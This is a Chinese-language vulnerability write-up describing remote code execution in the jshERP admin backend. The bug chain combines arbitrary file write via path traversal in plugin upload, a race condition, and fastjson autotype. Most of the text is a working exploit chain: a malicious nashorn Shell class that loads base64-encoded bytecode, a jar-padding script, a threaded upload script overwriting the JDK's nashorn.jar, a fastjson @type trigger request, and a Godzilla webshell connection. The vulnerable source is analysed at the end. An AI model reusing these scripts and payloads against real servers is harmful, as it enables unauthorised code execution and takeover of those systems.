# 任意文件写入+条件竞争致RCE

## 漏洞原理

后台存在jar包上传功能，但该功能后端代码`com.gitee.starblues.integration.operator.DefaultPluginOperator`逻辑是先将jar包保存到temp目录下，然后经过一系列条件验证和方法调用后再将其删除，因此存在条件竞争的可能性。而写入到temp目录下的代码存在目录穿越漏洞，可以上传jar包覆盖`JAVA_HOME/jre/lib/ext/`下的nashorn.jar。然后利用fastjson触发jar包中的`jdk.nashorn.tools.Shell`恶意类，实现任意代码执行。

漏洞利用条件：

1.后台admin权限

2.服务器jdk绝对路径

## 复现

构造nashorn.jar教程

https://github.com/Catherines77/Springboot-Arbitrary-file-writing-RCE

需要修改Shell.java代码，因为该项目fastjson触发的地方是GET请求，如果把javaCode当作参数发送会导致参数过长，报400，所以我们只能将javaCode打包进jar。

```java
package jdk.nashorn.tools;

import java.lang.reflect.Method;
import com.alibaba.fastjson.annotation.JSONCreator;
import com.alibaba.fastjson.annotation.JSONField;
import com.alibaba.fastjson.annotation.JSONType;
import java.io.BufferedReader;
import java.io.File;
import java.io.FileReader;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.io.PrintStream;
import java.io.PrintWriter;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.List;
import java.util.Locale;
import java.util.ResourceBundle;
import jdk.nashorn.api.scripting.NashornException;
import jdk.nashorn.internal.codegen.Compiler;
import jdk.nashorn.internal.ir.FunctionNode;
import jdk.nashorn.internal.ir.debug.ASTWriter;
import jdk.nashorn.internal.ir.debug.PrintVisitor;
import jdk.nashorn.internal.objects.Global;
import jdk.nashorn.internal.parser.Parser;
import jdk.nashorn.internal.runtime.Context;
import jdk.nashorn.internal.runtime.ErrorManager;
import jdk.nashorn.internal.runtime.JSType;
import jdk.nashorn.internal.runtime.ScriptEnvironment;
import jdk.nashorn.internal.runtime.ScriptFunction;
import jdk.nashorn.internal.runtime.ScriptRuntime;
import jdk.nashorn.internal.runtime.ScriptingFunctions;
import jdk.nashorn.internal.runtime.Source;
import jdk.nashorn.internal.runtime.options.Options;

@JSONType
public class Shell {
    private static final String MESSAGE_RESOURCE = "jdk.nashorn.tools.resources.Shell";
    private static String javaCode = "yv66.....";

    public Shell() {
        try {
            Class clazz = defineCls(javaCode);
            if (clazz != null) {
                clazz.newInstance();
            }
        } catch (Exception e) {}
    }

    public static Class defineCls(String message) {
        try {
            Method defineClass = ClassLoader.class.getDeclaredMethod("defineClass", byte[].class, Integer.TYPE, Integer.TYPE);
            defineClass.setAccessible(true);
            byte[] clazzByte = base64Decode(message);

            Class aClass = (Class) defineClass.invoke(
                    Thread.currentThread().getContextClassLoader(), 
                    clazzByte, 0, clazzByte.length
            );
            return aClass;
        } catch (Throwable var5) {
            var5.printStackTrace();
        }
        return null;
    }

    public static byte[] base64Decode(String str) throws Exception {
        try {
            Class clazz = Class.forName("sun.misc.BASE64Decoder");
            return (byte[]) clazz.getMethod("decodeBuffer", String.class)
                    .invoke(clazz.newInstance(), str);
        } catch (Exception var4) {
            Class clazz = Class.forName("java.util.Base64");
            Object decoder = clazz.getMethod("getDecoder").invoke(null);
            return (byte[]) decoder.getClass().getMethod("decode", String.class)
                    .invoke(decoder, str);
        }
    }
}
```

还需要注意的是jar包中的MANIFEST.MF也需要修改，添加

Plugin-Id: myplugin
Plugin-Version: 1.0

漏洞代码中需要验证这两个字段的值

```
Manifest-Version: 1.0
Created-By: 1.7.0_07 (Oracle Corporation)
Plugin-Id: myplugin
Plugin-Version: 1.0
Main-Class: jdk.nashorn.tools.Shell

Name: jdk/nashorn/
Implementation-Vendor: Oracle Corporation
Implementation-Title: Oracle Nashorn
Implementation-Version: 1.8.0_191-b12
Name: jdk/nashorn/
```

打包好后，再增加一些垃圾数据，增加jvm删除文件的时间，以便条件竞争，默认的上传大小限制为10M，所以我们需要将jar包扩到接近10M的大小。

```python
import zipfile
import shutil
import os
import random
import string

# --- 配置 ---
original_jar = r'C:\Users\13903\Desktop\nashorn\nashorn.jar'
output_jar = r'C:\Users\13903\Desktop\nashorn.jar'

# 严格限制：Tomcat 的 10485760 字节
# 我们设定一个更稳妥的上限，留出 10KB 缓冲区给 ZIP 的 Central Directory 结尾块
LIMIT = 10485760
SAFETY_MARGIN = 251150
TARGET_MAX = LIMIT - SAFETY_MARGIN


def get_random_string(length):
    return ''.join(random.choices(string.ascii_letters + string.digits, k=length))


# 1. 初始复制
shutil.copy(original_jar, output_jar)
print(f"[*] 初始大小: {os.path.getsize(output_jar)} 字节")

# 2. 追加数据
with zipfile.ZipFile(output_jar, 'a', compression=zipfile.ZIP_STORED) as zout:
    file_count = 0
    while True:
        # 必须先关闭或 flush 才能获取真实的物理大小
        # 但频繁开关很慢，我们预估一下：每次写入 4096 字节 + 约 100 字节 Header
        current_size = os.path.getsize(output_jar)

        if current_size >= TARGET_MAX:
            print(f"[!] 达到安全上限，停止追加。")
            break

        fake_path = f"META-INF/p/{get_random_string(4)}/{get_random_string(4)}.bin"

        # 写入随机数据
        zout.writestr(fake_path, os.urandom(4096))

        file_count += 1
        if file_count % 100 == 0:
            print(f"    当前物理大小: {current_size} 字节...")

print("-" * 30)
final_size = os.path.getsize(output_jar)
print(f"成功生成! 最终物理大小: {final_size} 字节")
print(f"距离限制还差: {LIMIT - final_size} 字节")
if final_size <= LIMIT:
    print("[OK] 文件合规，可以开始轰炸。")
else:
    print("[ERROR] 仍然超标，请调大 SAFETY_MARGIN。")
```

接下来开始条件竞争

```python
import requests
import threading
import time

# --- 配置 ---
target_ip = "192.168.239.138:9999"
token = "b160116d7b50439bac5cc0502746a866_0"
local_jar = r"C:\Users\13903\Desktop\nashorn.jar"
upload_url = f"http://{target_ip}/jshERP-boot/plugin/uploadInstallPluginJar"
headers = {'X-Access-Token': token}


# 限制上传频率，防止 OOM
def heavy_uploader():
    with open(local_jar, "rb") as f:
        data = f.read()
    while True:
        try:
            files = {'file': ("../../../../usr/lib/jvm/jdk1.8.0_201/jre/lib/ext/nashorn.jar", data)}
            requests.post(upload_url, files=files, headers=headers, timeout=5)
            # 上传后稍微停顿，给 JVM 喘息机会
            time.sleep(0.3)
        except:
            pass


if __name__ == "__main__":
    for _ in range(2):
        threading.Thread(target=heavy_uploader, daemon=True).start()

    while True:
        time.sleep(1)
```

fastjson触发数据包，用intruder无限发送

```http
GET /jshERP-boot/depotHead/list?search=%7B%22@type%22:%22jdk.nashorn.tools.Shell%22%7D&column=createTime&order=desc&field=id,&currentPage=1&pageSize=10 HTTP/1.1
Host: 192.168.239.1:3000
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36
Accept: application/json, text/plain, */*
X-Authorization: whoami
X-Access-Token: b160116d7b50439bac5cc0502746a866_0
Referer: http://192.168.239.1:3000/bill/sale_order
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9
Connection: keep-alive


```

python和burp同时运行，直到响应包出现set-cookie头部，就说明竞争成功了。

![image-20260211165311983](C:\Users\13903\AppData\Roaming\Typora\typora-user-images\image-20260211165311983.png)

哥斯拉连接，注意需要加上X-Access-Token头部

![image-20260211170355599](C:\Users\13903\AppData\Roaming\Typora\typora-user-images\image-20260211170355599.png)

## Code

插件上传代码位于`com.gitee.starblues.integration.operator.DefaultPluginOperator`

```java
    private Path uploadPlugin(MultipartFile pluginFile) throws Exception {
        if (pluginFile == null) {
            throw new IllegalArgumentException("Method:uploadPlugin param 'pluginFile' can not be null");
        } else {
            String fileName = pluginFile.getOriginalFilename();
            String suffixName = fileName.substring(fileName.lastIndexOf(".") + 1);
            if (StringUtils.isEmpty(suffixName)) {
                throw new IllegalArgumentException("Invalid file type, please select .jar or .zip file");
            } else if (!"jar".equalsIgnoreCase(suffixName) && !"zip".equalsIgnoreCase(suffixName)) {
                throw new IllegalArgumentException("Invalid file type, please select .jar or .zip file");
            } else {
                String tempPathString = this.integrationConfiguration.uploadTempPath() + File.separator + fileName;
                Path tempPath = PluginFileUtils.createExistFile(Paths.get(tempPathString));
                Files.write(tempPath, pluginFile.getBytes(), new OpenOption[0]);

                try {
                    Path verifyPath = this.uploadPluginVerify.verify(tempPath);
                    if (verifyPath != null) {
                        String targetPathString = this.pluginManager.getPluginsRoot().toString() + File.separator + fileName;
                        Path targetPluginPath = Paths.get(targetPathString);
                        if (Files.exists(targetPluginPath, new LinkOption[0])) {
                            this.backup(targetPluginPath, "upload", 2);
                        }

                        Files.copy(verifyPath, targetPluginPath, StandardCopyOption.REPLACE_EXISTING);
                        Files.deleteIfExists(tempPath);
                        return targetPluginPath;
                    } else {
                        Exception exception = new Exception(fileName + " verify failure, verifyPath is null");
                        this.verifyFailureDelete(tempPath, exception);
                        throw exception;
                    }
                } catch (Exception var9) {
                    this.verifyFailureDelete(tempPath, var9);
                    throw var9;
                }
            }
        }
    }
```

可以看到这两行代码将jar包保存到了临时目录，且未校验fileName，导致可以使用`../`进行目录穿越

```
String tempPathString = this.integrationConfiguration.uploadTempPath() + File.separator + fileName;
Path tempPath = PluginFileUtils.createExistFile(Paths.get(tempPathString));
Files.write(tempPath, pluginFile.getBytes(), new OpenOption[0]);
```

fastjson触发代码在`com.jsh.erp.utils.StringUtil`

不难看出如果能够控制search字符串，就能够让fastjson触发恶意代码。而这个getInfo方法在所有的/list controller中都有调用

![image-20260211171553353](C:\Users\13903\AppData\Roaming\Typora\typora-user-images\image-20260211171553353.png)

例如我上面复现的接口代码，这里的key不用管，我们只需要传入search即可

![image-20260211171611989](C:\Users\13903\AppData\Roaming\Typora\typora-user-images\image-20260211171611989.png)